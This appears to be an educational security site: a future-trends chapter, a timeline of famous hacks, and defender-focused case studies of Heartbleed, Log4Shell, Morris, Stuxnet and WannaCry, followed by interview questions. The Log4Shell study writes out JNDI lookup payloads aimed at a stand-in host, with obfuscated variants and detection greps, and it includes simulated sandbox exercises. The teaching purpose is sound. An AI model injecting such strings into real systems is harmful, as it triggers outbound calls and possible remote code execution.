Where this is going: AI agents, quantum computers, post-quantum cryptography, memory-safe code. Predictions are labeled as opinion, the dates and standards are not.
simple // the idea in plain words

Read this chapter differently. The earlier chapters are history. This one mixes facts (published standards, announced results) with opinion (what I think is likely). Opinions are marked. Check the sources, and expect parts of this page to age badly.

A normal bit is 0 or 1. A qubit can be in a blend of both until you measure it, and qubits can be entangled. For a few specific problems, that lets a quantum computer take shortcuts no ordinary computer can. It does not make every program faster.
Two algorithms matter for security:
Shor's algorithm (1994). Factors large numbers and solves discrete logarithms efficiently. That breaks RSA, Diffie-Hellman and elliptic-curve cryptography, which protect almost all web traffic and signatures today.
Grover's algorithm (1996). Speeds up brute-force search by a square root. That roughly halves the strength of a symmetric key, so AES-256 stays fine.
Today's machines are small and noisy. Nobody has yet built one that can break real RSA keys, and it needs many thousands of error-corrected qubits, which is much harder than adding raw qubits. Nobody knows exactly when it will happen.

New algorithms that run on ordinary computers but are believed to resist quantum attacks. In August 2024 NIST published the first standards: ML-KEM (key exchange, from Kyber), ML-DSA (signatures, from Dilithium) and SLH-DSA (hash-based signatures, from SPHINCS+). More are in progress.
The threat to plan for now
Harvest now, decrypt later. An attacker records encrypted traffic today and decrypts it when a quantum computer exists. Data that must stay secret for 10 to 30 years is already at risk.
Other bets on where tech goes (labeled opinion)

Opinion: AI agents become normal coworkers. Tools that read, write code, run commands and call APIs. The security job shifts toward permissions, audit trails and review, and away from typing every command by hand.
Opinion: memory-safe languages gradually replace C and C++ in new code. Rust, Go, Swift and managed languages remove whole bug classes (see Heartbleed). In 2024 the White House and CISA publicly urged the shift. Old C code will be around for decades.
Fact-ish trend: passwordless login (passkeys, FIDO2) spreads. Phishing-resistant authentication beats every password policy.
Fact-ish trend: software supply-chain controls (SBOMs, signed builds, provenance such as SLSA) become requirements for vendors.
Opinion: AI finds bugs faster than people fix them. Government and industry programs (such as DARPA's AI Cyber Challenge) test automatic bug finding and patching. Defenders and attackers both get the tools.
Hard to predict: neuromorphic chips, brain-computer interfaces, 6G, space networks. Treat any confident date as marketing.

A "physical qubit" is noisy. A "logical qubit" is built from many physical ones with error correction.
Published resource estimates have fallen over time. A 2019 estimate (Gidney and Ekerå) put RSA-2048 at around twenty million noisy qubits running for hours. A 2025 update by Gidney cut that to under a million. Real machines are still orders of magnitude smaller.
In late 2024 Google reported error correction improving as it added qubits (its "Willow" chip), a necessary milestone, not a break of anything.
What to do about it (this is the defender part)

Inventory where you use RSA, ECC and Diffie-Hellman: TLS, VPNs, SSH, code signing, certificates, stored data.
Crypto agility: make algorithms swappable without rewriting systems.
Prioritise long-lived secrets (medical, legal, state data) for early PQC.
Hybrid mode: combine a classical and a PQC key exchange. Browsers and large providers already do this for TLS.
Follow the NIST schedule: its 2024 draft guidance (IR 8547) proposes deprecating RSA and ECC around 2030 and disallowing them by 2035.

Let X = how many years the data must stay secret. Y = how many years your migration to PQC will take. Z = years until a cryptographically relevant quantum computer exists. If X + Y > Z, the data is already exposed to harvest-now-decrypt-later. You do not need to know Z precisely; the point is that X and Y are *your* numbers and are usually larger than people think.
What the NIST algorithms are built on

Lattice-based (ML-KEM, ML-DSA): hard problems about finding short vectors in high-dimensional grids (Learning With Errors). Fast, but key and signature sizes are larger than ECC.
Hash-based (SLH-DSA): security reduces to hash functions only. Conservative, big signatures.
Code-based (HQC, selected by NIST in 2025 as a backup KEM): error-correcting codes.
A lesson from the process: SIKE, a finalist-stage candidate, was broken in 2022 on a laptop by classical means (Castryck and Decru). New math needs years of public attack before trust.
Use 256-bit symmetric keys and SHA-256 or better; Grover costs a square root, not everything. AES-128 is probably fine in practice but the margin is smaller.

Whether large-scale fault-tolerant quantum computers arrive in 10, 20 or 50 years: experts disagree.
Whether lattice assumptions hold up.
Whether AI changes the offense/defense balance, and for how long.
Side-channels and bugs in *implementations* will break PQC deployments before the math does, as with every earlier algorithm.

NIST FIPS 203, 204, 205 (2024); NIST IR 8547 draft; Shor (1994); Grover (1996); Gidney and Ekerå (2019) and Gidney (2025) resource estimates; Mosca, *Cybersecurity in an era with quantum computers* (2018); CISA/NSA/NIST joint factsheet on quantum readiness.

A timeline of the worms, breaches and bugs that shaped security, from a joke program in 1971 to the XZ backdoor in 2024. Five of them have full case studies.
simple // the idea in plain words

Hacks are not random. Each famous one exposed a weakness that was already there, and each one changed how defenders work. The short version:
1971, Creeper. A harmless self-moving program on ARPANET. Reaper, the first "antivirus", chased it.
1982, Elk Cloner. A teenager's boot-sector prank on Apple II floppy disks.
1986, Brain. Early PC boot-sector virus.
1988, Morris worm. The first internet worm. Case study.
1989, AIDS Trojan. Early ransomware, delivered on floppies by mail.
1999, Melissa. A Word macro virus that mailed itself to your contacts.
2000, ILOVEYOU. A script worm sent as a love letter. Spread over email and hit tens of millions of computers.
2003, SQL Slammer. 376 bytes, spread across the internet in minutes.
2010, Stuxnet. Malware aimed at Iranian centrifuges. Case study.
2014, Heartbleed. Case study. Also Shellshock, a Bash flaw (CVE-2014-6271).
simple // the idea in plain words

2016, Mirai. Botnet from cameras with default passwords; knocked out DNS provider Dyn.
2017, WannaCry and NotPetya. WannaCry. NotPetya spread via a hijacked update to Ukrainian accounting software and caused billions in damage.
2020, SolarWinds. Attackers poisoned a software build and shipped a signed backdoor to thousands of organisations.
2021, Log4Shell. Case study. Also Colonial Pipeline, a ransomware attack that halted a US fuel pipeline.
2023, MOVEit. A SQL injection flaw (CVE-2023-34362) in a file-transfer product let a ransomware gang steal data from hundreds of organisations.
2024, XZ Utils. A backdoor slipped into a compression library by a long-term fake contributor, found by accident. And the CrowdStrike outage (July): not an attack, a faulty security-product update that crashed millions of Windows machines.
The same causes, over and over

| Cause | Examples
 | Memory-safety bugs in C | Morris (gets), Slammer, Heartbleed
 | Unpatched known flaws | Slammer, WannaCry, Equifax
 | Default or weak passwords | Morris (guessing), Mirai
 | Trusted input that was not | SQL injection (MOVEit), Log4Shell
 | Over-trust in suppliers and updates | NotPetya, SolarWinds, XZ
 | Flat networks | Target, WannaCry, NotPetya
 | Humans | ILOVEYOU, phishing in nearly every breach

1988 gave us CERT and incident coordination.
Code Red and Slammer (2001, 2003) gave us Patch Tuesday and firewalls on by default.
Stuxnet pushed ICS/OT security into the mainstream.
Heartbleed led to funding for critical open source and to the OpenBSD fork LibreSSL.
WannaCry made people disable SMBv1 and take backups seriously.
SolarWinds drove SBOMs, build provenance and executive orders on software supply chain.
Log4Shell made "do we use this library?" a question every company had to answer in a weekend.

Virus: needs a host file or user action to spread. Worm: spreads by itself over a network. Trojan: pretends to be something useful. Ransomware: encrypts or steals and demands payment. Botnet: many infected devices under one controller. Rootkit: hides itself at a low level.
How to read an incident report

What was the initial access? (phishing, exposed service, stolen credentials, supply chain)
What was the root cause? (one bug, or a chain of small failures)
What failed in detection? Dwell time (days between entry and discovery) is a measure of detection quality.
What limited the damage? (segmentation, backups, least privilege)
What would have stopped it cheaply? Often a patch, MFA or an egress rule.

MITRE ATT&CK describes attacker behavior as tactics (initial access, persistence, lateral movement, exfiltration) and techniques (T-numbers). Map any case study onto it and you see which controls would have broken the chain. The attack chain page on this site does this interactively.

A two-byte length field the server believed. Heartbleed let anyone read chunks of a server's memory, passwords and private keys included. This is the real vulnerable code and the real fix, line by line.

TLS is the encryption behind HTTPS. A TLS heartbeat is a tiny "are you still there?" message: the client sends some bytes and says how many, and the server echoes the same bytes back. The server code believed the number the client claimed.
If a client sent 3 bytes but claimed 64,000, the server copied 64,000 bytes starting at those 3 bytes. Whatever was next in the server's memory went into the reply: other users' sessions, usernames, passwords, and sometimes the server's private key. No login was needed and nothing was logged. Each probe leaked up to 64 KB.
It was disclosed on 7 April 2014 as CVE-2014-0160 and nicknamed Heartbleed. The bug had been in OpenSSL since version 1.0.1 shipped in March 2012. At disclosure, an estimated half a million or more of the web's HTTPS servers were exposed.

Dec 2011: the heartbeat feature is added to OpenSSL (by an outside contributor, reviewed and merged).
14 Mar 2012: OpenSSL 1.0.1 released with it enabled by default.
Early Mar to Apr 2014: Neel Mehta at Google and, separately, engineers at Codenomicon find the bug.
7 Apr 2014: advisory and fixed release, 1.0.1g. Public site and logo.
Apr 2014: certificate revocations and password-reset waves; Canada's tax agency reported about 900 social insurance numbers taken through it.
Late Apr 2014: the Linux Foundation starts the Core Infrastructure Initiative to fund critical open source; OpenBSD forks OpenSSL as LibreSSL.

p walks the received record. hbtype = *p++ reads the type byte.
n2s(p, payload) is a macro that reads two bytes from the packet into payload. This is a number the attacker chooses, from 0 to 65535.
pl = p marks where the client's payload starts. How many bytes of payload the client *really* sent is a different number: the length of the record, s->s3->rrec.length. The code never compares them.
OPENSSL_malloc(1 + 2 + payload + padding) allocates a response buffer sized from the attacker's claim.
memcpy(bp, pl, payload) copies payload bytes starting at pl. If the client really sent only 3 bytes, bytes 4 onward are not part of the request, they are whatever sits after it in the server's heap: an over-read.
The buffer is sent back to the client. The leak is in the response.
The bug class is a buffer over-read: the missing check is on a length that came from the outside. Compare the Morris worm, an over-write.
The fix (1.0.1g, paraphrased from the commit)

The heartbeat extension is rarely used on the web (it came from DTLS/UDP needs), yet it was on by default.
OpenSSL used its own memory allocator that reused freed blocks without clearing them, which made leaked memory more likely to contain secrets, and made memory-checking tools and hardened system allocators less able to flag the over-read.
Test suites rarely include malformed-length cases. A fuzzer pointed at the heartbeat handler finds it in minutes, and after Heartbleed, projects began running continuous fuzzing (for example Google's OSS-Fuzz, 2016).
Code reviewers read the new feature, but not for "does this length match reality?"
OpenSSL was maintained by a tiny team, with little funding, even though most of the internet depended on it.
What an attacker could actually get

Memory is random, so you do not choose what you get; you ask many times. Researchers recovered private keys from test servers, session cookies and passwords from live traffic. The leak is most dangerous because it leaves no trace in normal logs (the connection looks like a normal handshake).

Version check: which servers run OpenSSL 1.0.1 to 1.0.1f, with heartbeat enabled? Many scanners reported this within a day. For your own systems, nmap --script ssl-heartbleed -p 443 <your-host> tests for it.
Network: IDS signatures looked for a heartbeat record whose claimed length is larger than the record, or a heartbeat after the handshake with unusual size. Responses significantly larger than requests are a tell.
After the fact: you cannot know what leaked. The response is to assume the worst.

Upgrade to 1.0.1g or newer, or rebuild with -DOPENSSL_NO_HEARTBEATS.
Revoke and reissue certificates, because the private key may have leaked.
Reset passwords and invalidate sessions.
Notify users where required.

Validate every length that comes from the network. A length field is just another untrusted input.
Do not trust your own allocator to be harmless. Custom allocators can hide bugs.
Features off by default would have saved millions of servers.
Critical open source needs funding and testing, not just users.
Memory-safe languages make this bug class impossible by default (a bounds-checked slice would raise an error). See the future chapter.
Forward secrecy limits the damage of a stolen private key to future sessions, not past ones.

December 2021: one line in a logging library that treated text as instructions. If the attacker could get a string into a log, the server would reach out and fetch the attacker's code. Real code, the patch history, and how to hunt it in logs.

Log4j is the most popular Java logging library: whenever an app writes a line like "user alice logged in", there is a good chance Log4j did it. A feature of Log4j 2 called lookups lets a log message contain placeholders like ${java:version}, which Log4j replaces with a value. One of those lookups, jndi:, tells Java to contact a directory server by URL and fetch an object.
If an attacker could get text like ${jndi:ldap://attacker.example/x} into any log line, the server would make a network call to the attacker's server. Attackers could put that text in any field a site logs: the User-Agent header, a username, a chat message, a search box. Depending on the Java version and what was on the class path, the reply could lead to remote code execution.
It was reported privately to Apache on 24 November 2021 by Chen Zhaojun of Alibaba Cloud. It went public on 9 December 2021 as CVE-2021-44228, scored 10.0 out of 10, nicknamed Log4Shell. Minecraft servers were among the first hit (a chat message was enough). Within hours the internet was being scanned for it at scale, and ransomware and botnet crews adopted it within days.

2013: the JNDI lookup feature is added to Log4j 2 (before version 2.0 final).
24 Nov 2021: private report to Apache.
9 Dec 2021: public exploit and CVE. 2.15.0 released the same day.
13 Dec: 2.15.0 found incomplete in some configurations; 2.16.0 (CVE-2021-45046) disables message lookups and JNDI by default.
17 Dec: 2.17.0 fixes a denial-of-service via recursive lookups (CVE-2021-45105).
28 Dec: 2.17.1 fixes CVE-2021-44832 (needs attacker control of the configuration file).
Jul 2022: the US Cyber Safety Review Board calls it an "endemic vulnerability" and says it will linger for years.

Two things combine:
Message lookups. In vulnerable versions (2.0-beta9 through 2.14.1), Log4j scanned the *finished message* for ${...} and ran the lookup named inside. The message contained user-supplied text, so the user controlled which lookup ran.
The JNDI lookup. JndiLookup passes the rest of the string to Java's naming API. If the string is ldap://host/name, Java connects to host and asks for name.
The vulnerable pattern in an application (simplified)
The vulnerable library code (abridged from Log4j 2.14.1, JndiLookup.lookup)

key is whatever was inside ${jndi: ... }. It came from the attacker.
convertJndiName only normalises it (adds a java:comp/env/ prefix to bare names; **URLs with a scheme like ldap: pass straight through**).
jndiManager.lookup(jndiName) makes the outgoing call: ldap://, rmi://, or dns://.
The result is turned into a string and substituted in the log line. In older Java versions the response could point to a remote class that the JVM would load and run. Newer JDKs (8u191 and later) switched that off by default, but attackers moved to alternative paths that deserialize objects that happen to be on the class path ("gadgets").
No authentication, no special access, one string in one field. That is what made it so bad.

2.15.0: restricts JNDI lookups (to local hosts and a short list of protocols) and stops them from loading remote classes by default. This closed the original path but left holes in non-default setups.
2.16.0: removes message lookups completely and disables JNDI by default.
2.17.0 / 2.17.1: close the later recursion and configuration issues.
Interim mitigations: setting log4j2.formatMsgNoLookups=true (later shown to be incomplete), **deleting JndiLookup.class from the jar**, blocking outbound LDAP/RMI at the egress firewall, and WAF rules for ${jndi: (which attackers bypassed with obfuscation).
Why it was hard to clean up

Hidden inside other products. Log4j is a library, so it hides in an app's lib/ folder, in fat JARs, in vendor appliances. Companies first had to answer "where do we even use it?" (an SBOM answers that).
A long tail of vendors needed to patch their own products.
Obfuscation. Because Log4j resolves nested lookups, an attacker can hide the keyword: ${${lower:j}ndi:...}, ${${::-j}${::-n}${::-d}${::-i}:...}, or ${${env:NaN:-j}ndi...}. A plain search for jndi misses these.

Logs (anywhere a user can send text: web access logs, WAF, application logs, DNS):
grep -E '\$\{[^}]*j[^}]*n[^}]*d[^}]*i' access.log # rough, catches many obfuscations
grep -F '${jndi:' access.log # the plain form
Network: outbound connections from a server to unusual hosts on ports 389, 636, 1389, 1099 (LDAP/RMI); DNS queries for odd names that were produced by the server. Defenders used DNS canary tokens: if your canary domain shows up, someone sent a payload and the server resolved it. This also tells you which servers are vulnerable, since only a vulnerable one makes the lookup. Host: a Java process spawning a shell, curl, wget; new outbound connections from the app user; unexpected scheduled tasks. Software: scan for log4j-core JARs between 2.0-beta9 and 2.14.1 (Syft, Grype, CISA's scanner, or find / -name 'log4j-core*.jar').
The toy version of the idea (safe, fictional)

Log libraries should log, not interpret. Features that execute things from data are attack surface (the same lesson as XML external entities).
Egress filtering: servers rarely need to call out to arbitrary hosts. Block it, and this class of attack has nowhere to phone home.
Keep an SBOM so you know where a library is within hours, not weeks.
Open source needs maintainers. The Log4j team were volunteers who patched around the clock over the holidays.
A bug's severity is about reach: a mundane library used everywhere beats a famous product used in one place.

November 1988: a graduate student's experiment takes down a large part of the early internet. One unchecked gets() call, one debug feature, and a lot of weak passwords.

On the evening of 2 November 1988, a program began copying itself between Unix computers on the internet. Within hours, machines slowed to a crawl, mail queues jammed, and administrators at universities and research labs pulled their systems off the network. About 6,000 machines were affected, which was commonly estimated at roughly a tenth of the internet at that time (the internet then had around 60,000 hosts).
The author was Robert Tappan Morris, a Cornell graduate student. He said he wanted to measure the size of the internet, and he launched the worm from an MIT computer to hide where it came from. A bug in the worm's own logic made it copy itself far more often than intended, which is why it overloaded machines instead of staying quiet.
In 1990 he became the first person convicted under the US Computer Fraud and Abuse Act: three years of probation, 400 hours of community service and a fine.

It was the first worm to spread widely over the internet. It proved that one program could cripple many machines, and it led directly to the creation of CERT/CC at Carnegie Mellon to coordinate responses.

2 Nov, ~18:00: worm released.
2 Nov, ~21:00: machines at Berkeley, MIT and elsewhere noticeably slow.
2 Nov, night: teams at Berkeley and MIT begin disassembling the worm.
3 Nov, early morning: methods to stop it spread by phone and mailing lists (many of which were down).
3 to 4 Nov: fixes for sendmail and fingerd published; the worm's code was analysed in around 24 to 48 hours.
Nov 1988: DARPA announces CERT/CC.

fingerd buffer overflow. The finger daemon read a request into a 512-byte stack buffer with gets(), which never checks length. The worm sent a longer request that overwrote the stack and ran the worm's own code. (This door worked on VAX machines.)
sendmail DEBUG mode. Some sendmail servers were left with a debug option on, which let a remote sender give a command in the place of a recipient, and the command was run.
Trust relationships. rsh and rexec with .rhosts / hosts.equiv let a machine log in to others it trusted without a password. Once a user's account was taken, the worm hopped to everywhere that user was trusted.
Weak passwords. The worm tried the user's name, common variations, a built-in list of about 400 words, and the system dictionary against the password hashes it could read in /etc/passwd.

char line[512]; reserves 512 bytes on the stack for the request. The stack also holds this function's saved return address, a little above the buffer.
gets(line); copies bytes from the network into line until it sees a newline. It has **no idea how big line is**, so a 600-byte request writes past the end of the buffer and over whatever is next on the stack, including the saved return address.
When the function returns, the CPU jumps to the address on the stack. If an attacker controls that address, they control what runs next.
The C standard library has carried a warning on gets ever since; it was removed from the language in C11. The compiler warns today.

Bound the read to the size of the buffer: fgets(line, sizeof(line), stdin) (or check the result of read). Patched fingerds bounded the read, and gets is now banned by most coding standards. Modern systems add stack canaries, non-executable stacks (NX) and ASLR so that even a missed overflow is harder to turn into code execution.

To avoid infecting a machine twice, the worm asked a machine whether it already had a worm running, and gave up if so. Morris worried an administrator might fake the answer, so one time in seven the worm ignored the answer and infected anyway. That meant machines accumulated many copies, each using CPU, until they stopped working. A bit of defensive design against a countermeasure made the worm into a denial-of-service attack. It is a classic example of unintended consequences in self-replicating code.
How it was detected and stopped

Administrators noticed load averages spiking, many processes called sh, and full process tables. The telltale: ps showed shells running from /usr/tmp.
The worm deleted its files after loading, which made analysis hard, but researchers recovered the binary from memory and disassembled it.
Fixes: patch fingerd, turn off sendmail DEBUG, clean up trust files.

Never use unbounded reads. gets, strcpy, sprintf and scanf("%s") are red flags in code review. Modern tooling: static analysis, -fstack-protector, AddressSanitizer and fuzzing.
Debug features are attack surface. Disable them in production.
Trust relationships are lateral-movement paths. Use SSH keys, no shared trust, least privilege.
Password hashes were readable by all users in early Unix. Shadow passwords moved them into a root-only file.
Coordination is a control. CERT exists because no one knew who to call.
Self-propagating code needs a kill switch. WannaCry had one (by accident); this worm did not.
Same bug class as Heartbleed, 26 years later, but there the unchecked length was read instead of written.

The first widely known cyberweapon built to cause physical damage. It crossed an air gap on a USB stick, used four zero-days and stolen certificates, and lied to the operators while it wrecked centrifuges.

In June 2010 a small Belarusian security firm, VirusBlokAda, was asked to look at an Iranian customer's computers that kept crashing and rebooting. They found a worm unlike anything before: it used several unpublished Windows flaws, its drivers were signed with valid stolen certificates, and it carried a payload aimed at one specific industrial system.
Analysis by Symantec and the German engineer Ralph Langner over the next months showed what it was for. It looked for Siemens S7 PLCs (industrial controllers) running a particular configuration, in a facility with a very specific arrangement of frequency converters, the kind that spin uranium-enrichment centrifuges. When it found them, it quietly changed their rotor speeds, wearing the machines out, while showing operators normal readings.
The target was almost certainly Iran's Natanz enrichment plant. Reporting by the New York Times and others attributed Stuxnet to a joint US and Israeli effort (codename Olympic Games). Neither government has officially confirmed it, so treat attribution as widely reported, not proven. Independent estimates suggest on the order of a thousand centrifuges were taken out of service.

It showed that malware can break physical things, that air gaps are not safe (a USB stick crossed it), and that a well-funded actor will chain several unknown flaws and stolen identities. It started industrial control system (ICS/OT) security as a mainstream field.

2007 to 2009: earlier versions appear to have run, and a more aggressive one in 2009 to 2010.
Jun 2010: VirusBlokAda reports the worm; Microsoft begins working on the shortcut-file bug.
Jul 2010: the vulnerable-shortcut flaw is made public; Siemens and Microsoft respond.
Sep 2010: Langner publishes his analysis of the PLC payload, and Iranian officials acknowledge infections.
Feb 2011: Symantec's dossier is published.

Stuxnet was a long chain. No single trick is the story; the chaining is.
Delivery by USB. A flaw in how Windows rendered the icon of a shortcut (.LNK) file ran code the moment you opened a folder on a USB drive (CVE-2010-2568). No click on the file was needed. This crossed the air gap.
Spread inside the network. Used an older network-service flaw (MS08-067, the same one Conficker used), a print spooler flaw (CVE-2010-2729), and shared folders. It also used the default password that Siemens software used to talk to its database (CVE-2010-2772).
Gain SYSTEM. Two local privilege-escalation zero-days (in the keyboard layout code and in Task Scheduler) gave full control.
Hide. A rootkit driver, signed with certificates stolen from the Taiwanese chipmakers Realtek and JMicron, so Windows loaded it without complaint.

Find the target. On machines with Siemens Step 7 engineering software, it replaced a library (s7otbxdx.dll) that sits between Step 7 and the PLC. Now it could see, and change, everything the engineer sent to the PLC.
Sabotage with patience. It checked that the PLC matched the intended target. It then waited, recorded normal sensor data, changed the speeds at intervals (reports describe both speeding up and slowing down), and replayed the recorded good data to the operators' screens during the attack.
The logic as pseudo-code (a description, not working code)

on_usb_insert:
 if windows_shortcut_flaw_present: run_loader() # CVE-2010-2568
run_loader:
 install_signed_rootkit()
 spread(network_flaws, shared_folders, usb)
 if step7_installed:
 hook(s7otbxdx.dll)
 if plc_matches(target_fingerprint):
 record(normal_sensor_values)
 wait(weeks)
 modify(rotor_speed_commands, sometimes)
 while attacking: show_operators(recorded_values) # replay
 else:
 do_nothing() # stay quiet elsewhere
This is a paraphrase of the structure documented by Symantec, not their code and not malware. The point is the shape: a gate that only fires on the right target, and a lie to the monitoring.

Air gap is a speed bump, not a wall. Treat removable media as hostile; scan and restrict USB.
Sensors can lie when the controller is compromised. Cross-check with independent measurements, like vibration sensors on the shaft.
Code signing proves origin, not intent. Protect signing keys in hardware, and watch for unusual driver loads.
Patch the boring stuff, and change default passwords on industrial software.

Four zero-days in one piece of malware (a typical campaign uses zero or one). Zero-days are expensive. Spending four on one target says a lot about the actor's budget.
A specificity gate. It spread widely (some infected machines were outside Iran) but did damage only when it found one narrow configuration. This reduced the chance of detection and collateral damage, but it did not prevent either.
The payload was in the PLC code, written in an industrial language (STL), a place almost no antivirus looked.
Detection and why it took a year

Stuxnet was found because a bug in the malware crashed machines, not because defenders saw it. Typical antivirus relied on known samples. Detection ideas that would have worked: unusual DLL replacement in the Step 7 directory, unsigned or oddly signed drivers loaded from a USB path, new .LNK files on removable media, network traffic from the engineering workstation to the PLC outside change windows, and process data that disagrees with an independent measurement.

Duqu (2011) shared code and stole data; Flame (2012) was a large espionage tool; Industroyer (2016) and Triton (2017) attacked Ukrainian power and a Saudi petrochemical safety system, respectively. They moved from "destroy equipment quietly" to "cut the power" to "disable safety systems".
OT security basics (what to do now)

Segment IT from OT with a controlled boundary (the Purdue model).
Inventory every controller and engineering workstation.
Allow-list applications on engineering stations.
Monitor protocols such as Modbus and S7comm for unexpected writes.
Safety systems independent of control systems, as a physical backstop.

Scenario (fictional, simulated): an engineer pulls an hourly record from the plant historian, ~/hmi_vs_sensor.csv. Columns are hour,hmi_hz,vibration_hz. The operator screen (hmi_hz) should match the independent vibration sensor (vibration_hz). Find the first hour where they disagree. Submit it as HH:00, e.g. submit 06:00.
Solve it in the sandbox. Type hint when stuck and submit <answer> when you have it. Everything is simulated.

A stolen NSA exploit plus ransomware equals a worm that hit hospitals, factories and railways in a weekend. Told at concept level: what the bug was, how the worm spread, the accidental kill switch, and how to avoid being the next headline.

On Friday 12 May 2017, a ransomware program called WannaCry began spreading by itself between Windows computers. It encrypted files and displayed a demand for roughly $300 in bitcoin, rising to $600 after a few days. Within a day it had hit about 230,000 computers in some 150 countries, including parts of Britain's NHS, where ambulances were diverted and operations cancelled, plus a Spanish telecom, FedEx and a car maker's plants.
It spread because of a flaw in an old, rarely-needed Windows file-sharing protocol, SMBv1. An exploit for that flaw, codenamed EternalBlue, had been developed by the US NSA. In April 2017 a group calling itself the Shadow Brokers published it online. Microsoft had already patched the flaw in March 2017 (bulletin MS17-010). Machines that had applied the patch were safe. Millions had not.
A young researcher, Marcus Hutchins (MalwareTech), noticed the malware tried to contact a nonsense web address and registered it for about ten dollars. The malware treated "this address resolves" as "stop", which slowed the first wave. It was a kill switch, probably intended as a way to detect sandboxes. Later variants removed it.
US and UK governments attributed WannaCry to the Lazarus Group, linked to North Korea.

Mid 2016 to 2017: the Shadow Brokers appear and leak tools claimed to belong to the Equation Group (linked by researchers to the NSA).
14 Mar 2017: Microsoft issues MS17-010.
14 Apr 2017: the Shadow Brokers release the Windows tools, including EternalBlue.
12 May 2017: WannaCry outbreak begins; the kill switch is found by the evening.
13 to 15 May: Microsoft ships emergency patches even for unsupported Windows XP.

WannaCry was three things in one:
A worm component. Scan for machines with TCP port 445 open (SMB). Try the SMB flaw. If it works, run the malware on the target and repeat. It scanned the local network and random internet addresses.
A backdoor implant (DoublePulsar, also from the leak) installed on compromised machines, which other attackers later reused.
A ransomware payload. Generate a key for each file, encrypt files with it, protect that key with a public key from the attacker, and show the ransom note.

SMBv1 handles client requests in a kernel driver (srv.sys). A mistake in how a size value was converted, and then used to allocate and copy data, allowed a specially built request to overwrite kernel memory, and gave remote code execution as SYSTEM with no login. The details are public in the Microsoft bulletin and many analyses. This page does not reproduce the exploit; what matters for defenders is the class: an unauthenticated, network-reachable parser in the kernel, which is the worst combination.
If you want to read the actual mechanism, read the original research write-ups, not a PoC. Understanding the bug class (integer errors leading to heap overflow) is enough to patch, detect and design around it.
What stopped it, and what would have

| Control | Effect
 | Installing MS17-010 (two months earlier) | stops the exploit entirely
 | Disabling SMBv1 | removes the vulnerable code path
 | Blocking 445 at the internet edge and between segments | stops spread
 | Offline, tested backups | makes ransom unnecessary
 | The kill-switch domain | slowed the first wave
 | Network segmentation | contains a spread

Network: many hosts suddenly scanning port 445; SMB sessions to many different targets; DNS lookups of the kill-switch name (a defender's tell, and a reason not to block that name).
Endpoint: a process creating files with the .WNCRY extension; shadow-copy deletion commands (vssadmin delete shadows); mass file renames.
Vulnerability scanning: Nessus, OpenVAS and nmap's smb-vuln-ms17-010 script (use on your own hosts) show who is unpatched.

Many health systems ran Windows XP/7 on medical devices that vendors had not certified for updates, on flat networks where file shares reached everything. The UK National Audit Office later found that at least 81 of 236 trusts were disrupted, and that the NHS was not specifically targeted: it was collateral damage of an untargeted worm. A basic fix existed and had been recommended by the NHS months earlier.

The case reopened an old debate: should a government keep software flaws secret to use them, or disclose them for patching? Microsoft's president Brad Smith compared it to the military losing missiles. NSA reportedly told Microsoft about the flaw shortly before the leak, which is why a patch existed. Reasonable people disagree on the policy; the defender's lesson is simpler: assume any secret exploit will leak eventually.

Another EternalBlue-based tool, plus credential theft (Mimikatz-style), spread via a poisoned update to Ukrainian tax software. It looked like ransomware but was destructive, with no workable recovery. Costs ran into billions (Maersk, Merck, FedEx/TNT). It shows how quickly the same exploit gets repurposed.

Patch SLAs for critical remote bugs: days, not months.
Retire legacy protocols (SMBv1, Telnet) once nothing needs them. Audit with Get-SmbServerConfiguration on Windows or Nmap's smb-protocols script.
Segment. Workstations rarely need to reach each other on 445.
Backups must be offline or immutable, and restore-tested.
Know your unpatchable assets and wrap them: isolate, restrict, monitor.
Do not block a kill-switch domain in your own DNS: it can make the malware run.

Scenario (fictional, simulated): it is 12 May 2017, a Friday afternoon. You have the asset list ~/assets.csv with columns host,os,smb1,ms17_010_patched,port445_from_internet. Which one host is the most urgent: SMBv1 on, not patched, and reachable on 445 from the internet? Submit its hostname, e.g. submit web01.
Solve it in the sandbox. Type hint when stuck and submit <answer> when you have it. Everything is simulated.

You turn messy data into answers people can act on. SQL is the core skill, and the job rewards clear thinking and clear communication more than fancy math.

Data analysts pull data (mostly with SQL), clean it, summarize it and present findings through dashboards and short write-ups. A good analyst asks what decision the numbers are for, checks data quality before trusting it, and explains caveats plainly.
It is a strong fit for someone who likes databases and logic, and it overlaps with security work (log analysis is data analysis) and with software development.

Do interview basics too: opening, behavioral and ethics questions apply to every role.

[easy] Why data analysis?
You like finding the answer inside the numbers and explaining it. Describe a project where you asked a question, found an answer, and what happened next.
[easy] How do you explain results to non-technical people?
Lead with the answer, use one clear chart, skip jargon, say how confident you are and what could change the conclusion, and finish with a recommendation.
[easy] What do you do when the stakeholder's question is vague?
Ask what decision it informs, who will use it, and what "good" looks like. Restate the question in writing and agree on definitions before analysis.

[easy] What is the difference between WHERE and HAVING?
WHERE filters rows before grouping. HAVING filters groups after aggregation.
[easy] What is the difference between INNER, LEFT, RIGHT and FULL JOIN?
INNER: only matches. LEFT: all left rows plus matches. RIGHT: all right rows plus matches. FULL: all rows from both with NULLs where no match.
[easy] What is a primary key vs. a foreign key?
A primary key uniquely identifies a row. A foreign key references another table's primary key and enforces relationships.
[easy] What does GROUP BY do?
Collapses rows into groups so you can use aggregates such as COUNT, SUM and AVG per group. Every selected column must be grouped or aggregated.
[easy] What is the difference between COUNT(*), COUNT(column) and COUNT(DISTINCT column)?
COUNT(*) counts all rows. COUNT(column) counts non-NULL values. COUNT(DISTINCT column) counts unique non-NULL values.

[normal] How do you find duplicate rows?
SELECT col, COUNT(*) FROM t GROUP BY col HAVING COUNT(*) > 1; Decide which row to keep (for example with ROW_NUMBER() partitioned by the key) before deleting.
[normal] Explain window functions and give an example.
Functions that compute across related rows without collapsing them. ROW_NUMBER(), RANK(), LAG() and running totals with SUM(x) OVER (PARTITION BY a ORDER BY b). Example: top sale per customer.
[normal] How do you get the second highest salary?
SELECT MAX(salary) FROM emp WHERE salary < (SELECT MAX(salary) FROM emp); or use DENSE_RANK() and pick rank 2, which also handles ties.
[normal] What is normalization and why do it?
Organizing tables to reduce redundancy and update anomalies (1NF, 2NF, 3NF). Denormalizing is a deliberate trade-off for read speed in reporting.
[normal] How do you handle NULLs in analysis?

Understand why they exist (unknown, not applicable, missing). Use COALESCE, IS NULL, and be careful that comparisons with NULL are unknown and that aggregates ignore them. Document the choice.
[normal] What is an index and what is the cost?
A data structure (often a B-tree) that speeds up lookups and sorts. The cost is extra storage and slower writes. Index columns used in filters and joins.
[normal] How do you validate your numbers?
